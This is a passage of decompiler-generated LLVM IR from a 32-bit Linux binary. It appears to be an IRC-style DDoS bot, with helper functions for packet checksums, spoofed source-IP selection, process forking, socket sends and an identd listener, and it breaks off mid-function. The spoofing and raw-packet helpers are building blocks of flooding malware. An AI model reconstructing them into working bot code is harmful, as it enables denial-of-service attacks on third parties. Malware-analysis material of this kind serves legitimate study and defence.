dec_label_pc_804814a:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_804814a = load i32, i32* @global_var_807063c.25, align 4
  %v1_804814f = icmp eq i32 %v0_804814a, 0
  br i1 %v1_804814f, label %dec_label_pc_8048165, label %dec_label_pc_8048153

dec_label_pc_8048153:                             ; preds = %dec_label_pc_804814a
  br label %dec_label_pc_8048165

dec_label_pc_8048165:                             ; preds = %dec_label_pc_8048153, %dec_label_pc_804814a
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804814a, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_8048170 = load i32, i32* @eax, align 4
  store i32 %v0_8048170, i32* %stack_var_-4, align 4
  %v4_8048170 = ptrtoint i32* %stack_var_-4 to i32
  %v0_8048172 = load i32, i32* @edx, align 4
  %v9_8048184 = call i32 @__uClibc_main(i32 134572602, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134643620, i32 %v0_8048172, i32 %v4_8048170, i32 %v0_8048170)
  ret i32 %v9_8048184

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8069625.26 to i32)
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8048196 = load i32, i32* @ebp, align 4
  %v4_80481b621 = add i32 %arg2, -1
  %v9_80481b622 = sub i32 0, %arg2
  %v10_80481b623 = and i32 %arg2, %v9_80481b622
  %v11_80481b624 = icmp slt i32 %v10_80481b623, 0
  %v12_80481b625 = icmp eq i32 %v4_80481b621, 0
  %v13_80481b626 = icmp slt i32 %v4_80481b621, 0
  %v3_80481ba27 = icmp eq i1 %v13_80481b626, %v11_80481b624
  %v4_80481ba28 = icmp eq i1 %v12_80481b625, false
  %v5_80481ba29 = and i1 %v4_80481ba28, %v3_80481ba27
  br i1 %v5_80481ba29, label %dec_label_pc_80481a5, label %dec_label_pc_80481bc

dec_label_pc_80481a5:                             ; preds = %entry, %dec_label_pc_80481a5
  %stack_var_8.032 = phi i32 [ %v4_80481b2, %dec_label_pc_80481a5 ], [ %arg2, %entry ]
  %stack_var_4.031 = phi i16* [ %v23_80481ae, %dec_label_pc_80481a5 ], [ %arg1, %entry ]
  %v3_80481ab30 = phi i16 [ %v6_80481ab, %dec_label_pc_80481a5 ], [ 0, %entry ]
  %v4_80481a5 = ptrtoint i16* %stack_var_4.031 to i32
  %v2_80481a8 = load i16, i16* %stack_var_4.031, align 2
  %v6_80481ab = add i16 %v2_80481a8, %v3_80481ab30
  %v5_80481ae = add i32 %v4_80481a5, 2
  %v23_80481ae = inttoptr i32 %v5_80481ae to i16*
  %v4_80481b2 = add i32 %stack_var_8.032, -2
  %v4_80481b6 = add i32 %stack_var_8.032, -3
  %v9_80481b6 = sub i32 2, %stack_var_8.032
  %v10_80481b6 = and i32 %v4_80481b2, %v9_80481b6
  %v11_80481b6 = icmp slt i32 %v10_80481b6, 0
  %v12_80481b6 = icmp eq i32 %v4_80481b6, 0
  %v13_80481b6 = icmp slt i32 %v4_80481b6, 0
  %v3_80481ba = icmp eq i1 %v13_80481b6, %v11_80481b6
  %v4_80481ba = icmp eq i1 %v12_80481b6, false
  %v5_80481ba = and i1 %v4_80481ba, %v3_80481ba
  br i1 %v5_80481ba, label %dec_label_pc_80481a5, label %dec_label_pc_80481bc

dec_label_pc_80481bc:                             ; preds = %dec_label_pc_80481a5, %entry
  %v3_80481ab.lcssa = phi i16 [ 0, %entry ], [ %v6_80481ab, %dec_label_pc_80481a5 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_80481ae, %dec_label_pc_80481a5 ]
  %v4_80481ba.lcssa = phi i1 [ %v4_80481ba28, %entry ], [ %v4_80481ba, %dec_label_pc_80481a5 ]
  br i1 %v4_80481ba.lcssa, label %dec_label_pc_80481da, label %dec_label_pc_80481c2

dec_label_pc_80481c2:                             ; preds = %dec_label_pc_80481bc
  %v1_80481ce = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_80481ce = load i8, i8* %v1_80481ce, align 1
  %v3_80481ce = zext i8 %v2_80481ce to i16
  %v6_80481d7 = add i16 %v3_80481ce, %v3_80481ab.lcssa
  br label %dec_label_pc_80481da

dec_label_pc_80481da:                             ; preds = %dec_label_pc_80481bc, %dec_label_pc_80481c2
  %v3_80481e0 = phi i16 [ %v3_80481ab.lcssa, %dec_label_pc_80481bc ], [ %v6_80481d7, %dec_label_pc_80481c2 ]
  %v4_80481da = sext i16 %v3_80481e0 to i32
  %v2_80481dd = sdiv i32 %v4_80481da, 65536
  %v2_80481e4 = add nsw i32 %v2_80481dd, %v4_80481da
  %sext = mul i32 %v2_80481e4, 65536
  %v2_80481ec = ashr i32 %sext, 31
  %v4_80481ef = sdiv i32 %sext, 65536
  %v6_80481ef = add nsw i32 %v2_80481ec, %v4_80481ef
  %v4_80481f24 = urem i32 %v6_80481ef, 65536
  %v1_80481f9 = xor i32 %v4_80481f24, 65535
  store i32 %v0_8048196, i32* @ebp, align 4
  ret i32 %v1_80481f9

; uselistorder directives
  uselistorder i32 %sext, { 1, 0 }
  uselistorder i32 %v4_80481da, { 1, 0 }
  uselistorder i16 %v3_80481ab.lcssa, { 1, 0 }
  uselistorder i32 %v4_80481b6, { 1, 0 }
  uselistorder i32 %v4_80481b2, { 1, 0 }
  uselistorder label %dec_label_pc_80481da, { 1, 0 }
  uselistorder label %dec_label_pc_80481a5, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp11 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048201 = load i32, i32* @ebx, align 4
  store i32 %v0_8048201, i32* %stack_var_-8, align 4
  %v4_8048205 = ptrtoint i8* %arg1 to i32
  %v2_8048208 = load i8, i8* %arg1, align 1
  %v12_8048211 = icmp eq i8 %v2_8048208, 42
  br i1 %v12_8048211, label %dec_label_pc_8048239, label %dec_label_pc_8048217

dec_label_pc_8048217:                             ; preds = %entry
  %v12_8048217 = icmp eq i8 %v2_8048208, 63
  br i1 %v12_8048217, label %dec_label_pc_804828c, label %dec_label_pc_804821d

dec_label_pc_804821d:                             ; preds = %dec_label_pc_8048217
  %v4_804821d = icmp eq i8 %v2_8048208, 0
  br i1 %v4_804821d, label %dec_label_pc_8048228, label %dec_label_pc_80482c6

dec_label_pc_8048228:                             ; preds = %dec_label_pc_804821d
  %v2_804822b = load i8, i8* %tmp11, align 1
  %v2_804822e = sext i8 %v2_804822b to i32
  br label %dec_label_pc_804831c

dec_label_pc_8048239:                             ; preds = %entry
  %v1_804823c = add i32 %v4_8048205, 1
  %v4_8048244 = inttoptr i32 %v1_804823c to i8*
  %v5_8048247 = call i32 @strwildmatch(i8* %v4_8048244, i32 %arg2)
  %v1_804824c = icmp eq i32 %v5_8048247, 0
  br i1 %v1_804824c, label %dec_label_pc_804827a, label %dec_label_pc_8048250

dec_label_pc_8048250:                             ; preds = %dec_label_pc_8048239
  %v2_8048253 = load i8, i8* %tmp11, align 1
  %v4_8048256 = icmp eq i8 %v2_8048253, 0
  br i1 %v4_8048256, label %dec_label_pc_8048281, label %dec_label_pc_804825a

dec_label_pc_804825a:                             ; preds = %dec_label_pc_8048250
  %v1_804825d = add i32 %arg2, 1
  %v5_8048268 = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_804825d)
  %v1_804826d = icmp eq i32 %v5_8048268, 0
  br i1 %v1_804826d, label %dec_label_pc_804827a, label %dec_label_pc_8048281

dec_label_pc_804827a:                             ; preds = %dec_label_pc_804825a, %dec_label_pc_8048239
  br label %dec_label_pc_8048281

dec_label_pc_8048281:                             ; preds = %dec_label_pc_8048250, %dec_label_pc_804825a, %dec_label_pc_804827a
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804827a ], [ 1, %dec_label_pc_804825a ], [ 1, %dec_label_pc_8048250 ]
  br label %dec_label_pc_804831c

dec_label_pc_804828c:                             ; preds = %dec_label_pc_8048217
  %v2_804828f = load i8, i8* %tmp11, align 1
  %v4_8048292 = icmp eq i8 %v2_804828f, 0
  br i1 %v4_8048292, label %dec_label_pc_80482be, label %dec_label_pc_8048296

dec_label_pc_8048296:                             ; preds = %dec_label_pc_804828c
  %v1_8048299 = add i32 %arg2, 1
  %v1_804829d = add i32 %v4_8048205, 1
  %v4_80482a2 = inttoptr i32 %v1_804829d to i8*
  %v5_80482a5 = call i32 @strwildmatch(i8* %v4_80482a2, i32 %v1_8048299)
  %v1_80482aa = icmp ne i32 %v5_80482a5, 0
  %. = zext i1 %v1_80482aa to i32
  br label %dec_label_pc_80482be

dec_label_pc_80482be:                             ; preds = %dec_label_pc_8048296, %dec_label_pc_804828c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_804828c ], [ %., %dec_label_pc_8048296 ]
  br label %dec_label_pc_804831c

dec_label_pc_80482c6:                             ; preds = %dec_label_pc_804821d
  %v2_80482c9 = load i8, i8* %arg1, align 1
  %v2_80482cc = sext i8 %v2_80482c9 to i32
  %v2_80482d2 = call i32 @__GI_toupper(i32 %v2_80482cc)
  store i32 %v2_80482d2, i32* @ebx, align 4
  %v2_80482dc = load i8, i8* %tmp11, align 1
  %v2_80482df = sext i8 %v2_80482dc to i32
  %v2_80482e5 = call i32 @__GI_toupper(i32 %v2_80482df)
  %v0_80482ea = load i32, i32* @ebx, align 4
  %v12_80482ea = icmp eq i32 %v0_80482ea, %v2_80482e5
  %v1_80482ec = icmp eq i1 %v12_80482ea, false
  br i1 %v1_80482ec, label %dec_label_pc_8048316, label %dec_label_pc_80482ee

dec_label_pc_80482ee:                             ; preds = %dec_label_pc_80482c6
  %v1_80482f1 = add i32 %arg2, 1
  %v1_80482f5 = add i32 %v4_8048205, 1
  %v4_80482fa = inttoptr i32 %v1_80482f5 to i8*
  %v5_80482fd = call i32 @strwildmatch(i8* %v4_80482fa, i32 %v1_80482f1)
  %v1_8048302 = icmp ne i32 %v5_80482fd, 0
  %.5 = zext i1 %v1_8048302 to i32
  br label %dec_label_pc_8048316

dec_label_pc_8048316:                             ; preds = %dec_label_pc_80482ee, %dec_label_pc_80482c6
  %storemerge = phi i32 [ 1, %dec_label_pc_80482c6 ], [ %.5, %dec_label_pc_80482ee ]
  br label %dec_label_pc_804831c

dec_label_pc_804831c:                             ; preds = %dec_label_pc_80482be, %dec_label_pc_8048281, %dec_label_pc_8048228, %dec_label_pc_8048316
  %stack_var_-24.0 = phi i32 [ %storemerge4, %dec_label_pc_8048281 ], [ %storemerge3, %dec_label_pc_80482be ], [ %v2_804822e, %dec_label_pc_8048228 ], [ %storemerge, %dec_label_pc_8048316 ]
  %v2_8048322 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048322, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048208, { 2, 0, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804831c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048281, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048328 = load i32, i32* @edi, align 4
  store i32 %v0_8048328, i32* %stack_var_-8, align 4
  %v4_804832f = ptrtoint i32* %stack_var_12 to i32
  %v5_8048347 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_80756e0.27 to i32), i32 %arg2, i32 %v4_804832f)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_80756e0.27 to i32), i32* @edi, align 4
  %v3_804835f = call i32 @_strlen(i8* bitcast (i8** @global_var_80756e0.27 to i8*))
  %v4_804835f = mul i32 %v3_804835f, -1
  %v5_804835f = add i32 %v4_804835f, -2
  store i32 %v5_804835f, i32* @ecx, align 4
  %v1_8048365 = sub i32 0, %v4_804835f
  %v5_8048378 = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_80756e0.27 to i32), i32 %v1_8048365)
  %v0_804837d = load i32, i32* @esp, align 4
  %v1_804837d = add i32 %v0_804837d, 36
  %v6_804837d = xor i32 %v0_804837d, -2147483648
  %v7_804837d = and i32 %v1_804837d, %v6_804837d
  %v8_804837d = icmp slt i32 %v7_804837d, 0
  store i1 %v8_804837d, i1* @of, align 1
  %v2_8048380 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048380, i32* @edi, align 4
  ret i32 %v5_8048378
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_8048389 = load i8, i8* @global_var_80756c8.28, align 8
  %v10_8048390 = icmp eq i8 %v0_8048389, 1
  %v1_8048392 = icmp eq i1 %v10_8048390, false
  br i1 %v1_8048392, label %dec_label_pc_80483bd, label %dec_label_pc_8048394

dec_label_pc_8048394:                             ; preds = %entry
  %v0_8048394 = load i32, i32* @global_var_807e1b0.29, align 16
  %v3_80483ac = call i32 @Send(i32 %v0_8048394, i32 ptrtoint ([30 x i8]* @global_var_806962c.30 to i32))
  br label %dec_label_pc_804845b

dec_label_pc_80483bd:                             ; preds = %entry
  %v1_80483bd = call i32 @fork(i32 %tmp4)
  %v4_80483c5 = icmp eq i32 %v1_80483bd, 0
  %v1_80483c9 = icmp eq i1 %v4_80483c5, false
  br i1 %v1_80483c9, label %dec_label_pc_80483d6, label %dec_label_pc_80483cb

dec_label_pc_80483cb:                             ; preds = %dec_label_pc_80483bd
  br label %dec_label_pc_804845b

dec_label_pc_80483d6:                             ; preds = %dec_label_pc_80483bd
  %v0_80483d6 = load i32, i32* @global_var_80756d4.31, align 4
  %v1_80483db = add i32 %v0_80483d6, 1
  store i32 %v1_80483db, i32* @global_var_80756d4.31, align 4
  %v2_80483e6 = mul i32 %v1_80483db, 4
  %v1_80483e9 = add i32 %v2_80483e6, 4
  %v1_80483ef = call i32 @malloc(i32 %v1_80483e9)
  %v0_804842211 = load i32, i32* @global_var_80756d4.31, align 4
  %v6_804842b13 = icmp eq i32 %v0_804842211, 1
  br i1 %v6_804842b13, label %dec_label_pc_804842d, label %dec_label_pc_8048400

dec_label_pc_8048400:                             ; preds = %dec_label_pc_80483d6, %dec_label_pc_8048400
  %storemerge14 = phi i32 [ %v4_804841f, %dec_label_pc_8048400 ], [ 0, %dec_label_pc_80483d6 ]
  %v2_8048403 = mul i32 %storemerge14, 4
  %v5_8048408 = add i32 %v2_8048403, %v1_80483ef
  store i32 %v5_8048408, i32* @ecx, align 4
  %v0_8048413 = load i32, i32* @global_var_807f354.32, align 4
  %v2_8048418 = add i32 %v0_8048413, %v2_8048403
  %v1_804841b = inttoptr i32 %v2_8048418 to i32*
  %v2_804841b = load i32, i32* %v1_804841b, align 4
  %v2_804841d = inttoptr i32 %v5_8048408 to i32*
  store i32 %v2_804841b, i32* %v2_804841d, align 4
  %v4_804841f = add i32 %storemerge14, 1
  %v0_8048422 = load i32, i32* @global_var_80756d4.31, align 4
  %v1_8048427 = add i32 %v0_8048422, -1
  %v6_804842b = icmp ugt i32 %v1_8048427, %v4_804841f
  br i1 %v6_804842b, label %dec_label_pc_8048400, label %dec_label_pc_804842d

dec_label_pc_804842d:                             ; preds = %dec_label_pc_8048400, %dec_label_pc_80483d6
  %v0_8048422.lcssa = phi i32 [ %v0_804842211, %dec_label_pc_80483d6 ], [ %v0_8048422, %dec_label_pc_8048400 ]
  %v2_8048432 = mul i32 %v0_8048422.lcssa, 4
  %v5_8048435 = add i32 %v2_8048432, %v1_80483ef
  %v1_8048438 = add i32 %v5_8048435, -4
  store i32 %v1_8048438, i32* @edx, align 4
  %v2_804843e = inttoptr i32 %v1_8048438 to i32*
  store i32 %v1_80483bd, i32* %v2_804843e, align 4
  %v0_8048440 = load i32, i32* @global_var_807f354.32, align 4
  %v1_8048448 = call i32 @free(i32 %v0_8048440)
  store i32 %v1_80483ef, i32* @global_var_807f354.32, align 4
  br label %dec_label_pc_804845b

dec_label_pc_804845b:                             ; preds = %dec_label_pc_80483cb, %dec_label_pc_8048394, %dec_label_pc_804842d
  %stack_var_-24.0 = phi i32 [ %v1_80483bd, %dec_label_pc_804842d ], [ %v1_80483bd, %dec_label_pc_80483cb ], [ 1, %dec_label_pc_8048394 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_804841f, { 1, 0 }
  uselistorder i32 %v2_8048403, { 1, 0 }
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v0_804842211, { 1, 0 }
  uselistorder i32 %v1_80483ef, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804845b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048400, { 1, 0 }
}

define i32 @getspoof(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048466 = load i8*, i8** @global_var_80756cc.33, align 4
  %v1_8048466 = ptrtoint i8* %v0_8048466 to i32
  %v2_804846b = icmp eq i8* %v0_8048466, null
  %v1_804846d = icmp eq i1 %v2_804846b, false
  br i1 %v1_804846d, label %dec_label_pc_8048479, label %dec_label_pc_804846f

dec_label_pc_804846f:                             ; preds = %entry
  %v0_804846f = call i32 @random()
  br label %dec_label_pc_80484c2

dec_label_pc_8048479:                             ; preds = %entry
  %v0_8048479 = load i64, i64* @global_var_80756d0.34, align 8
  %v1_8048479 = trunc i64 %v0_8048479 to i32
  %v9_804847e = icmp eq i32 %v1_8048479, 1
  %v1_8048481 = icmp eq i1 %v9_804847e, false
  br i1 %v1_8048481, label %dec_label_pc_8048495, label %dec_label_pc_8048483

dec_label_pc_8048483:                             ; preds = %dec_label_pc_8048479
  %v2_804848b = call i32 @ntohl(i32 %v1_8048466)
  br label %dec_label_pc_80484c2

dec_label_pc_8048495:                             ; preds = %dec_label_pc_8048479
  %v0_8048495 = call i32 @random()
  %v0_804849c = load i64, i64* @global_var_80756d0.34, align 8
  %sext = mul i64 %v0_804849c, 4294967296
  %v5_80484a1 = sdiv i64 %sext, 4294967296
  %v6_80484ab = zext i32 %v0_8048495 to i64
  %v14_80484ab = urem i64 %v6_80484ab, %v5_80484a1
  %v15_80484ab = trunc i64 %v14_80484ab to i32
  %v0_80484ae = load i8*, i8** @global_var_80756cc.33, align 4
  %v1_80484ae = ptrtoint i8* %v0_80484ae to i32
  %v2_80484b3 = add i32 %v1_80484ae, %v15_80484ab
  %v1_80484b6 = add i32 %v2_80484b3, 1
  %v2_80484ba = call i32 @ntohl(i32 %v1_80484b6)
  br label %dec_label_pc_80484c2

dec_label_pc_80484c2:                             ; preds = %dec_label_pc_8048483, %dec_label_pc_804846f, %dec_label_pc_8048495
  %stack_var_-8.0 = phi i32 [ %v2_80484ba, %dec_label_pc_8048495 ], [ %v2_804848b, %dec_label_pc_8048483 ], [ %v0_804846f, %dec_label_pc_804846f ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_80484c2, { 2, 0, 1 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80484ef = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_80484ef

dec_label_pc_80484d0:                             ; preds = %dec_label_pc_8048512, %dec_label_pc_80484ef
  %v3_80484e1 = call i32 @_strlen(i8* %arg1)
  %v6_80484e8 = add i32 %v4_80484ef, %v3_80484e1
  %v1_80484eb = add i32 %v6_80484e8, -1
  %v1_80484ec = inttoptr i32 %v1_80484eb to i8*
  store i8 0, i8* %v1_80484ec, align 1
  br label %dec_label_pc_80484ef

dec_label_pc_80484ef:                             ; preds = %entry, %dec_label_pc_80484d0
  %v3_8048500 = call i32 @_strlen(i8* %arg1)
  %v6_8048507 = add i32 %v4_80484ef, %v3_8048500
  %v1_804850a = add i32 %v6_8048507, -1
  %v1_804850b = inttoptr i32 %v1_804850a to i8*
  %v2_804850b = load i8, i8* %v1_804850b, align 1
  %v10_804850e = icmp eq i8 %v2_804850b, 13
  br i1 %v10_804850e, label %dec_label_pc_80484d0, label %dec_label_pc_8048512

dec_label_pc_8048512:                             ; preds = %dec_label_pc_80484ef
  %v3_8048523 = call i32 @_strlen(i8* %arg1)
  %v6_804852a = add i32 %v4_80484ef, %v3_8048523
  %v1_804852d = add i32 %v6_804852a, -1
  %v1_804852e = inttoptr i32 %v1_804852d to i8*
  %v2_804852e = load i8, i8* %v1_804852e, align 1
  %v11_8048531 = icmp eq i8 %v2_804852e, 10
  br i1 %v11_8048531, label %dec_label_pc_80484d0, label %dec_label_pc_8048535

dec_label_pc_8048535:                             ; preds = %dec_label_pc_8048512
  %v1_804853a = sext i8 %v2_804852e to i32
  ret i32 %v1_804853a

; uselistorder directives
  uselistorder i8 %v2_804852e, { 1, 0 }
  uselistorder i32 %v4_80484ef, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80484ef, { 1, 0 }
}

define i32 @randstring(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804853b = load i32, i32* @ebp, align 4
  store i32 %v0_804853b, i32* %stack_var_-4, align 4
  %v4_804853b = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804853b, i32* @ebp, align 4
  %v2_8048548 = call i32 @__GI_time(i32* null)
  %v1_8048550 = call i32 @srand(i32 %v2_8048548)
  %v4_8048563 = ptrtoint i8* %arg1 to i32
  %v1_8048566 = add i32 %v4_8048563, 1
  %v1_804856a = call i32 @malloc(i32 %v1_8048566)
  %tmp15 = bitcast i8** %stack_var_-16 to i32*
  store i32 %v1_804856a, i32* %tmp15, align 4
  %v5_8048572 = icmp eq i32 %v1_804856a, 0
  %v1_8048576 = icmp eq i1 %v5_8048572, false
  %tmp26 = inttoptr i32 %v1_804856a to i8*
  br i1 %v1_8048576, label %dec_label_pc_80485b7.preheader, label %dec_label_pc_80485ce

dec_label_pc_80485b7.preheader:                   ; preds = %entry
  %v7_80485bd22 = icmp sgt i8* %arg1, null
  br i1 %v7_80485bd22, label %dec_label_pc_8048591, label %dec_label_pc_80485bf

dec_label_pc_8048591:                             ; preds = %dec_label_pc_8048591, %dec_label_pc_80485b7.preheader
  %v4_80485a6 = phi i8* [ %tmp26, %dec_label_pc_80485b7.preheader ], [ %v4_80485a6.pre, %dec_label_pc_8048591 ]
  %storemerge523 = phi i32 [ 0, %dec_label_pc_80485b7.preheader ], [ %v4_80485b4, %dec_label_pc_8048591 ]
  %v0_8048591 = call i32 @random()
  %v1_8048591 = sext i32 %v0_8048591 to i64
  %v15_804859b = urem i64 %v1_8048591, 62
  %v16_804859b = trunc i64 %v15_804859b to i32
  %v5_80485a6 = ptrtoint i8* %v4_80485a6 to i32
  %v6_80485a6 = add i32 %v5_80485a6, %storemerge523
  %v6_80485ac = add i32 %v16_804859b, ptrtoint ([63 x i8]* @global_var_806964c.35 to i32)
  %v1_80485af = inttoptr i32 %v6_80485ac to i8*
  %v2_80485af = load i8, i8* %v1_80485af, align 1
  %v3_80485b2 = inttoptr i32 %v6_80485a6 to i8*
  store i8 %v2_80485af, i8* %v3_80485b2, align 1
  %v4_80485b4 = add i32 %storemerge523, 1
  %v6_80485ba = inttoptr i32 %v4_80485b4 to i8*
  %v7_80485bd = icmp slt i8* %v6_80485ba, %arg1
  %v4_80485a6.pre = load i8*, i8** %stack_var_-16, align 4
  br i1 %v7_80485bd, label %dec_label_pc_8048591, label %dec_label_pc_80485bf

dec_label_pc_80485bf:                             ; preds = %dec_label_pc_8048591, %dec_label_pc_80485b7.preheader
  %v4_80485c2 = phi i8* [ %tmp26, %dec_label_pc_80485b7.preheader ], [ %v4_80485a6.pre, %dec_label_pc_8048591 ]
  %v5_80485c2 = ptrtoint i8* %v4_80485c2 to i32
  %v6_80485c2 = add i32 %v5_80485c2, %v4_8048563
  %v1_80485c5 = inttoptr i32 %v6_80485c2 to i8*
  store i8 0, i8* %v1_80485c5, align 1
  %v3_80485c8 = load i8*, i8** %stack_var_-16, align 4
  %v4_80485c8 = ptrtoint i8* %v3_80485c8 to i32
  br label %dec_label_pc_80485ce

dec_label_pc_80485ce:                             ; preds = %entry, %dec_label_pc_80485bf
  %storemerge = phi i32 [ %v4_80485c8, %dec_label_pc_80485bf ], [ 0, %entry ]
  %v2_80485d1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80485d1, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80485b4, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i8** %stack_var_-16, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80485ce, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1260 = alloca i32, align 4
  store i32 2, i32* %stack_var_-1260, align 4
  %v4_80485f4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_80485fc = icmp eq i32 %v4_80485f4, -1
  br i1 %v13_80485fc, label %dec_label_pc_8048852, label %dec_label_pc_8048606

dec_label_pc_8048606:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 113, i32* %stack_var_-1260, align 4
  %v2_8048613 = call i32 @htons(i16 113)
  %v2_8048626 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v4_80485f4, i32* %stack_var_-1260, align 4
  %v4_804864e = call i32 @bind(i32 %v4_80485f4, i32 %v2_8048626, i32 16)
  %v10_8048653 = icmp eq i32 %v4_804864e, -1
  br i1 %v10_8048653, label %dec_label_pc_8048852, label %dec_label_pc_804865c

dec_label_pc_804865c:                             ; preds = %dec_label_pc_8048606
  store i32 %v4_80485f4, i32* %stack_var_-1260, align 4
  %v3_804866a = call i32 @listen(i32 %v4_80485f4, i32 1)
  %v10_804866f = icmp eq i32 %v3_804866a, -1
  br i1 %v10_804866f, label %dec_label_pc_8048852, label %dec_label_pc_8048678

dec_label_pc_8048678:                             ; preds = %dec_label_pc_804865c
  %v0_8048678 = load i32, i32* %stack_var_-1260, align 4
  %v1_8048678 = call i32 @fork(i32 %v0_8048678)
  %v1_804867d = icmp eq i32 %v1_8048678, 0
  br i1 %v1_804867d, label %dec_label_pc_8048852, label %dec_label_pc_8048685

dec_label_pc_8048685:                             ; preds = %dec_label_pc_8048678
  store i32 16, i32* %stack_var_-36, align 4
  %v2_804868c = ptrtoint i32* %stack_var_-36 to i32
  %v2_804868f = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v4_80485f4, i32* %stack_var_-1260, align 4
  %v4_80486a0 = call i32 @accept(i32 %v4_80485f4, i32 %v2_804868f, i32 %v2_804868c)
  %v4_80486a8 = add i32 %v4_80486a0, 1
  %v13_80486a8 = icmp eq i32 %v4_80486a8, 0
  %v1_80486ac = icmp eq i1 %v13_80486a8, false
  br i1 %v1_80486ac, label %dec_label_pc_80486ba.preheader, label %dec_label_pc_80486ae

dec_label_pc_80486ae:                             ; preds = %dec_label_pc_8048685
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_80486b5 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80486ba.preheader

dec_label_pc_80486ba.preheader:                   ; preds = %dec_label_pc_80486ae, %dec_label_pc_8048685
  %v2_80486c4 = ptrtoint i32* %stack_var_-1228 to i32
  %tmp27 = bitcast i32* %stack_var_-1228 to i8*
  %v2_80486d8 = udiv i32 %v4_80486a0, 32
  %v1_80486de = urem i32 %v4_80486a0, 32
  %v9_80486e1 = shl i32 1, %v1_80486de
  %v2_8048703 = ptrtoint i32* %stack_var_-1100 to i32
  %v2_804874d = mul nuw nsw i32 %v2_80486d8, 4
  %v3_804874d = add nsw i32 %v2_804874d, -1224
  br label %dec_label_pc_80486ba

dec_label_pc_80486ba:                             ; preds = %dec_label_pc_80486ba.preheader, %dec_label_pc_804873f
  store i32 %v2_80486c4, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80486cb = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80486e1 = load i32, i32* @ebp, align 4
  %v4_80486e1 = add i32 %v3_804874d, %v0_80486e1
  %v5_80486e1 = inttoptr i32 %v4_80486e1 to i32*
  %v6_80486e1 = load i32, i32* %v5_80486e1, align 4
  %v12_80486e1 = or i32 %v6_80486e1, %v9_80486e1
  store i32 %v12_80486e1, i32* %v5_80486e1, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  store i32 %v4_80486a8, i32* %stack_var_-1260, align 4
  %v6_804872a = call i32 @__libc_select(i32 %v4_80486a8, i32 %v2_80486c4, i32 0, i32 0, i32 %v2_8048703)
  %v2_804872f = icmp slt i32 %v6_804872a, 0
  %v1_8048731 = icmp eq i1 %v2_804872f, false
  br i1 %v1_8048731, label %dec_label_pc_804873f, label %dec_label_pc_8048733

dec_label_pc_8048733:                             ; preds = %dec_label_pc_80486ba
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_804873a = call i32 @__GI_exit(i32 0)
